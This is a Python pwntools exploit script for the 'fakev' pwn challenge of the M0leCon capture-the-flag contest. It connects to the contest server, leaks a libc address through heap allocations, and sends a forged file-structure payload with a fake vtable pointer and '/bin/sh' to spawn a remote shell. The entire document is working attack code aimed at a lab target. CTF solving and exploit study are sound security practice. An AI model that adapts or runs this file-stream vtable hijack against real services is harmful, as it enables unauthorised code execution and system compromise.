from pwn import *
from ropgadget.loaders.universal import xrange

exe = ELF("/home/alessio/Scrivania/tools/CTFs/M0leCon/fakev/fakev")
libc = ELF("/home/alessio/Scrivania/tools/CTFs/M0leCon/fakev/libc.so.6")
context.binary = exe
HOST = "challs.m0lecon.it"
PORT = 9013
p = remote(HOST, PORT)


def choice(idx):
    p.sendlineafter("Choice: ", str(idx))


def open_(idx):
    choice(1)
    p.sendlineafter("Index: ", str(idx))


# send to the server the 4th choice
def close_():
    choice(4)


def read_(idx):
    choice(2)
    p.sendlineafter("Index: ", str(idx))
    data = p.recvline()
    return data


for i in xrange(1, 9):
    open_(i)

for i in range(1, 9):
    close_()

leak = read_(1)
# leak the libc address
libc = u64(leak[8:16])
log.success("libc --> %s" % hex(libc))
# leak the base address of libc
libc_base = libc - 0x3ebca0
log.success("libc_base --> %s" % hex(libc_base))

fake_vtable_addr = libc_base + 0x3e8360 + 0x8
log.success("fake_vtable address --> %s" % fake_vtable_addr)
for i in xrange(1, 10):
    open_(i)
choice(b"4\x00\x00\x00\x00\x00\x00\x00" + p64(0x602110) + p64(0) * 5 + p64(0x602190) + p64(0) * 2 + p64((0x602190 - 100) / 2) + b"KKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQ/bin/sh\x00" + p64(0x602258) + b"TTTTTTTTUUUUUUUU" + p64(0x6021b0) + p64(0x602108) + p64(0) + b"YYYYYYYYZZZZZZZZ[[[[[[[[::::::::" + p64(fake_vtable_addr) + p64(libc_base + 0x4f440))

p.interactive()
